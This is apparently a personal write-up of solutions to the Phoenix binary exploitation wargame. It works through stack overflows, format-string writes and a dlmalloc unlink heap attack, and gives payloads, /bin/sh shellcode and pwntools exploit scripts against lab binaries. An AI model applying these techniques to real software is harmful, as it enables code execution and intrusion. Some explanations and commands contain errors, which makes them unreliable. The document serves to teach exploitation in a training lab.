# Phoenix: is basic binar exploitation challenge:
---

### Note: challenges are located in /opt/phoenix/amd64
---

# All stack Challenges:

---

## Stack0:
- gets take un check data which could be used to create the buffer over flow:

```
python -c 'print("A"*70)' | ./stack_zero

```

## Stack1:

- The challenge is similar to the above challenge but one has to look for following things:
  1- read the little-Endians -> which store data from large to smaller values, so after the overflow provide the variables value in reverse order
  2- In the code the user provided input is taken as the argument in the for of ``` char ***argv ``` which is then copied to the buffer of length 64 buffer[64]:
  
  ```
   strcpy(locals.buffer, argv[1]);
  ```
  
  ==Note==: The file takes the input as the argument so we can not pass as the pipe it will give us the error instead we will do this:
  ```
  /stack-one $(python -c 'print("A" * 65 + "\x62\x59\x6c\x49")')
  
  ```
## Stack2:
- In this challenge code is using the envirnment variable with the name of ==ExploitateEducation== to be passed as the argument in the stack.
- so in order make the buffer overflow happen we will do :
```
export ExploitEducation = $(python -c 'print("A" * 65 + \x0a\x09\x0a\x0d)')

```
Simply run the function and we will have the over flow.

## stack3:

- In the stack three one has to first find the address of the complete_level function:
```
objdump -d ./stack-three | grep complete_level
000000000040069d <complete_level>:

```
```
0x40069d
python -c 'print "A" * 64 + "\x9d\x06\x40"' | ./stack-three
```

## stack4

- In this challenge the buffer ovflow occurs in the start_level funtions which is called in the main() function:

```

void start_level() {
  char buffer[64];
  void *ret;

  gets(buffer);

  ret = __builtin_return_address(0);
  printf("and will be returning to %p\n", ret);
}

int main(int argc, char **argv) {
  printf("%s\n", BANNER);
  start_level();
}


```

- What we have to do is:
  1- overflow the stack buffer until it reach the return address of strart_level() function
  2- keep in mind all the functions returns addressess are saved on the stack.
  3- the return address of the start_level will also be present on the stack.
  
- How to find the write amount of characters to overflow the buffer:
  1- open the program in the gdb.
  2- place the breakpoint after the gets() function.
  3- fill the buffer with dummy data:
	  ```
	  run < <(python -c 'print("A" * 64)')
	  ```
  4- Now find the location of overflowed function:
	  ```
	  x/100x $rsp // rsp is the stack pointer it is the top most address of the stack
	  ```
  5- the above prompt will dump the address and data stored on the stack in form of hex.
  6- The top left address will mostly likely show the overflowed buffer.
  7- next step is to find the return address of start_level which could by find by:
	  ```
	  info frame // the <saved $rip=????> will be the return address of the start level function
	  ```
  8- To calculate the right amount of characters to reach the start_level return address one can subtract the address of overflowed buffer with the return address
  of the start_level function.
  
	  ```
	  0x7fffffffe4f8 - 0x7fffffffe4a0 = 0x58 
	  which in decimal is = 88
	  ```
  9- Now to curate a payload:
	  ```
	  python -c 'print("A" * 88 + "\x1d\x06\x40")' | ./stack-four
	  ```
## stack 5

- In this challenge one has to inject the the shell code which will return a /bin/sh shell $
- How to approach the problem:
  1- Inject the shellcode on the stack.
  2- change the return address and point it towards the shell code
  3- lastly the shell will execute.

- Procedure of Payload creation:
		1- first copy a shell code from the internet and convert it into little endian hex format:
   		```
	'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff' \
	'\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'	
	```
		2- In the begining of the buffer according to your choice add the NOP -> No operation in the stack:
			```
		'\x90' * 30 // here hex for NOP is \x90 and 30 is number of times we want to insert it.
		```
		3- after adding the NOP now add the shellcode which is defined previously.
		4- The Purpose of NOP is to make the shell land where we want to land it and exclude any discrepancy which comes 
		in the way.
		5- keep in the view that total lenth of buffer is 128, of which we 30 has been defined for the NOP operators.
		6- after the NOP code and shellcode, add the buffer over flow script which is:
			```
		python -c 'print("A" * 98)' // we are multipling it with 98 because 30 are already allocated.
		```
		7- At last overwrite the value of RBP buffer to 8 bit digits as BBBBBBBB.
		8- open the executable in the gdb and set the break point after the gets() function in the 
		start_level function.
		9- then run the code as:
		```
		run < <(python payload.py)
		```
		10- open the info frame and see where is the start_level function will return after the excution:
		```
		gef> info frame
		Stack level 0, frame at 0x7fffffffe520:
		rip = 0x4005a1 in start_level; saved rip = 0x7fffffffe480
		called by frame at 0x7fffffffe528
		Arglist at 0x7fffffffe510, args: 
		Locals at 0x7fffffffe510, Previous frame's sp is 0x7fffffffe520
		Saved registers:
		rbp at 0x7fffffffe510, rip at 0x7fffffffe518

		```
			- here is the saved rip = 0x7fffffffe480 is where the start_level will return 
		11- Use the pwn tool 
	

		```
			from pwn import *
			import sys

		shellcode = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff' \
            '\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
		buff  = '\x90' * 30                 # NOP sled
		buff += shellcode                  # Shellcode
		buff += 'A' * (128 - len(buff))    # Padding to reach saved RBP
		buff += 'BBBBBBBB'                 # Fake RBP
		buff += p64(0x7fffffffe480)        # Overwritten RIP // execute the code and analyse the stack to see were your shellcode is starting and replace it with that.


		sys.stdout.write(buff)

		```

To run the code:
```
(python payload.py; cat) | /opt/phoenix/amd64/stack-five
```



---


---


---

# Format string Challenges:
---
## Format-Zero:

- The format string vulnerability occurs when output is directly passed to the prinf() or sprintf() like:

	```
	char[100] name;
	scanf(name);
	printf(name);
	```
	
- Here in the printf function the type is not specified before the name user can pass it on type as %x, %n, %i, %p etc.

- which will pop of the data from the stack and show it on the screen:

	```
	user@phoenix-amd64:/opt/phoenix/amd64$ python -c "print '%p' * 3" | ./format-zero 
	Welcome to phoenix/format-zero, brought to you by https://exploit.education
	Well done, the 'changeme' variable has been changed!
	
	```
- Here I have provided three %p pointer types it will go into stack and print the values stored at 0, 1 and 2 on the screen, as shown.


## Format-One:

- In the next challenge we will pop of four values and then change the last one with the provided address in the little endian format:

	```
	user@phoenix-amd64:/opt/phoenix/amd64$ python -c "print '%p' * 4 + '\x6c\x4f\x76\x45'" | ./format-zero 
	Welcome to phoenix/format-zero, brought to you by https://exploit.education
	Well done, the 'changeme' variable has been changed!

	```


## Format-Two:

- To solve this we have find the address of **changeme** variables address from the **32 bit** binary located in **i486** directory.
- use the objdump or gdb to get the address rest is similar pop off the data from the stack until it reaches and changes the changemes value:

	```
	user@phoenix-amd64:/opt/phoenix/i486$ ./format-two $'\x68\x98\x04\x08%x %x %x %x %x %x %x %x %x %x %x %n \n'
	Welcome to phoenix/format-two, brought to you by https://exploit.education
	hffffd7d3 100 0 f7f84b67 ffffd610 ffffd5f8 80485a0 ffffd4f0 ffffd7d3 100 3e8  
	Well done, the 'changeme' variable has been changed correctly!

	```



## Format-Three:

- Like the previous challenge in which we were required to wirte to specific area for memory.

- In this challenge we are required to write specific value to certain portion of memory.

- The steps involved includes:
  1- Getting the location of int changeme which is global variable:

	```
	  user@phoenix-amd64:~$ nm /opt/phoenix/i486/format-three | grep changeme
	  08049844 B changeme
	  
	  ```
  2- crafting a payload:
  
  ```
  from pwn import *
  changeme = 0x8049844
  
  ```
  3- keep in mind the int variable takes 4 bytes of space when build in 32 bit binary and 8 in 64 bit binary where 1 byte = 8 bits
  4- So the value of changeme will be spaned on **0x8049844** **0x8049845** **0x8049846** **0x8049847**.
  5- Lets make it little endian using the pwn tools **p32()**
	  ```
	  buff = ""
	  buff += p32(changeme + 0)
	  buff += p32(changeme + 1)
	  buff += p32(changeme + 2)
	  buff += p32(changeme + 3)
	  ```
  6- Poping the values of the stack until we reach the desired location usin the **%x**
  7- On the previous testing I came to know the provided value is shown at the 12 position(offset) so:
	  ```
	  buff += "%x"*11
	  ```
  8- Now adding the values four times as the int is 4 bytes long:
  
	  ```
	  buff += "A"*244
	  buff += "%n"
	  
	  buff += "A"*51
	  buff += "%n"
	  
	  buff += "A"*205
	  buff += "%n"
	  
	  buff += "A"*31
	  buff += "%n"
	  ```
	  
  9- lastly pass the payload as the input:
  
  ```
  print(buff)
  
  ```
  
  **complete code:**
  
  ```
  from pwn import *
  changeme = 0x8049844 
  
  buff = ""
  buff += p32(changeme + 0)
  buff += p32(changeme + 1)
  buff += p32(changeme + 2)
  buff += p32(changeme + 3) 

  buff += "A"*244
  buff += "%n"
	  
  buff += "A"*51
  buff += "%n"
	  
  buff += "A"*205
  buff += "%n"
	  
  buff += "A"*31
  buff += "%n"
  
  print(buff)
  ```
  
  **output:**
  ```
  user@phoenix-amd64:~$ python format-four.py | /opt/phoenix/i486/format-three 
  Welcome to phoenix/format-three, brought to you by https://exploit.education
  DEFG0 0 0 f7f81cf7 f7ffb000 ffffd618 8048556 ffffc610 ffffc610 fff 0 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
  Well done, the 'changeme' variable has been changed correctly!

  ```

## Format-Four:

- Similar to the previous challenge where we have to write specific value on certain location in the memory in this challenge we have redirect the execuation of congratulation_function so that it gets 
executed.

- we will hijack the **exit** call in the bounce function and instead by replacing it with the address of **congratulation**.
- To do that we have to first get the address of **exit()** function using:

```
 objdump -M intel -R /opt/phoenix/i486/format-four
 
```

- using the previous code we only had to change the address in the changeme to the address of the exit function the code will be as:

```
from pwn import *
  exit = 0x080497e4 
  
  buff = ""
  buff += p32(exit + 0)
  buff += p32(exit + 1)
  buff += p32(exit + 2)
  buff += p32(exit + 3) 

  buff += "A"*244
  buff += "%n"
	  
  buff += "A"*51
  buff += "%n"
	  
  buff += "A"*205
  buff += "%n"
	  
  buff += "A"*31
  buff += "%n"
  
  print(buff)


```


---

# Heap Exploitation :
---

## Heap-Zero

	- The heap-zero challenge requires the understanding of UAF heap vulnerability in which the freed malloc object is 
	used again.
	- Freed malloc object can be used to redirect to call the intended function which we want to call.
	- In this particular challenge we have to overflow the heap upto 72 bytes on the 32 bit machine in order to 
	reach out to the desired location and then add the address of the function which want to call.
	
	```
	user@phoenix-amd64:~$ /opt/phoenix/i486/heap-zero $(python -c "print 'A'*72 + '\x35\x88\x04\x08'") 
	Welcome to phoenix/heap-zero, brought to you by https://exploit.education
	data is at 0xf7e69008, fp is at 0xf7e69050, will be calling 0x8048835
	Congratulations, you have passed this level

	```


## Heap-One

- Vulnerability:
  1- strcpy takes the input as the pointer without bound checking.
  2- the malloc functionality could be exploited using it.
  
- Procedure of Exploitation:
  1- The functiona takes two arguments.
  2- We have to overwrite the first argument using the buffer overflow and point to the puts function
  3- Then we will redirect the second argument to run the winer function.
  4- The offset required to exploit the vulnerability is 20 for first argument.
  
  
  ```sh
  
  user@phoenix-amd64:~$ /opt/phoenix/i486/heap-one  $(python -c "print 'A'*20 + '\x40\xc1\x04\x08'") $(python -c "print '\x9a\x88\x04\x08'")
  Congratulations, you've completed this level @ 1750751291 seconds past the Epoch

  
  ```


## Heap-Two

- Vulnerability:
  - after freeing the malloc it is again called.
  
Exploitation:
	- We have to print the **You are already Logged In!**.
	- We have to flow the pattern defined in code:
	
	
	```sh
	
	user@phoenix-amd64:~$ /opt/phoenix/i486/heap-two 
	Welcome to phoenix/heap-two, brought to you by https://exploit.education
	[ auth = 0, service = 0 ]
	auth AAAA
	[ auth = 0x8049af0, service = 0 ]
	reset
	[ auth = 0x8049af0, service = 0 ]
	serviceAAAAAAAAAAAAABB
	[ auth = 0x8049af0, service = 0x8049af0 ]
	login
	you have logged in already!
	[ auth = 0x8049af0, service = 0x8049af0 ]


	```
	
	- After everthing is reset the malloc is freed
	- and the freed memory is allocated to the **service**.
	- at last when the user logged it will be checking the previous memory.
	- if we have provided with the same characters as login it will give **You are already Logged In!**.

## Heap-Three:
### **Exploiting Doug Lea's Malloc (dlmalloc) with Unlink Attack**  

**Challenge**: `heap-three` from [Exploit Education Phoenix](https://exploit.education/phoenix/)  
**Goal**: Hijack execution to call the `winner()` function by exploiting `free()`'s `unlink()` macro.  

---

 **1. Understanding the Target**  
The program allocates **three heap chunks (`a`, `b`, `c`)** and frees them in reverse order (`free(c)`, `free(b)`, `free(a)`). Our goal is to:  
- **Overflow `a` into `b`** to corrupt `b`'s metadata.  
- **Trick `free()` into merging chunks incorrectly**, leading to arbitrary write via `unlink()`.  
- **Overwrite `puts@GOT`** to redirect execution to `winner()`.  

---
 **2. Key Concepts**  
### **Heap Chunk Structure**  
Each chunk has metadata:  
```c
struct chunk {
    size_t prev_size;  // Size of previous chunk (if free)
    size_t size;       // Current chunk size + flags (e.g., `PREV_INUSE`)
    char data[];       // User data
};
```
- **`PREV_INUSE` (P-bit)**: Last bit of `size`.  
  - `1` = Previous chunk is in use.  
  - `0` = Previous chunk is free (can merge).  

### **The `unlink()` Macro**  
When `free()` merges chunks, it calls `unlink()`, which does:  
```c
FD = chunk->fd;  // Forward pointer  
BK = chunk->bk;  // Backward pointer  
FD->bk = BK;     // Writes BK to *(FD + 12)  
BK->fd = FD;     // Writes FD to *(BK + 8)  
```
We abuse this to **overwrite `puts@GOT`**.  

---

 **3. Exploit Strategy**  
### **Step 1: Overflow `a` into `b`**  
We corrupt `b`'s metadata to:  
1. **Set `b->size = -80`**  
   - Clears `PREV_INUSE` (`P=0`), tricking `free()` into thinking the previous chunk (`a`) is free.  
   - Negative size bypasses sanity checks (old `dlmalloc` bug).  

2. **Set `b->prev_size = -4`**  
   - Makes `free()` calculate `prev_chunk = current_chunk - (-4) = current_chunk + 4`.  
   - Points **inside `b` itself**, allowing us to control `fd`/`bk`.  

### **Step 2: Fake Chunk Inside `b`**  
We craft a fake free chunk inside `b` with:  
- **`fd = puts@GOT - 12`** (where `unlink()` will write).  
- **`bk = shellcode_addr`** (address of our shellcode in `a`).  

When `free(b)` runs:  
```c
FD = puts@GOT - 12  
BK = shellcode_addr  
*(FD + 12) = BK  // Overwrites puts@GOT with shellcode_addr  
```

### **Step 3: Shellcode Execution**  
We place **shellcode in `a`** that calls `winner()`:  
```asm
push 0x80487d5  ; winner() address  
ret             ; Jump to winner()
```
Now, when `puts()` is called, it jumps to `winner()` instead!  

---

 **4. Final Exploit Code**  
```python
from pwn import *

# Addresses
puts_got = 0x804c13c        # puts@GOT entry
winner_addr = 0x80487d5     # winner() function
shellcode_addr = 0xf7e6900c # Address of shellcode in 'a'

# Shellcode: "push winner_addr; ret"
shellcode = asm("push {}; ret".format(hex(winner_addr)))

# Craft payload
payload = ""

# Chunk 'a' (contains shellcode + fake chunk metadata)
payload += 'AAAA'           # Will be overwritten by FD
payload += shellcode        # Shellcode to call winner()
payload += ' '              # strcpy delimiter

# Chunk 'b' (overflow into 'c')
payload += 'B' * 32         # Fill chunk 'b'
payload += p32(0xfffffffc)  # c->prev_size = -4 (points inside 'c')
payload += p32(0xffffffb0)  # c->size = -80 (P=0, invalid size)
payload += ' '              # strcpy delimiter

# Chunk 'c' (fake chunk for unlink())
payload += 'AAAA'           # Junk (prev_size of fake chunk)
payload += p32(puts_got - 12)  # c->fd (where to write)
payload += p32(shellcode_addr) # c->bk (what to write)

print(payload)
```

---

 **5. Running the Exploit**  
```bash
$ ./heap-three "$(python exploit.py)"
Congratulations, you've completed this level! 
```

---

 **6. Why This Works**  
✅ **Heap Overflow**: Corrupts `b`'s metadata to control `unlink()`.  
✅ **Fake Chunk**: Tricks `free()` into processing malicious `fd`/`bk`.  
✅ **GOT Overwrite**: Hijacks `puts()` to jump to `winner()`.  

This is a classic **dlmalloc unlink attack**—patched in modern `glibc` but still relevant for older binaries.  

---
### **Further Reading**  
- [Understanding dlmalloc (Doug Lea's Malloc)](http://gee.cs.oswego.edu/dl/html/malloc.html)  
- [Heap Exploitation Guide](https://heap-exploitation.dhavalkapil.com/)  

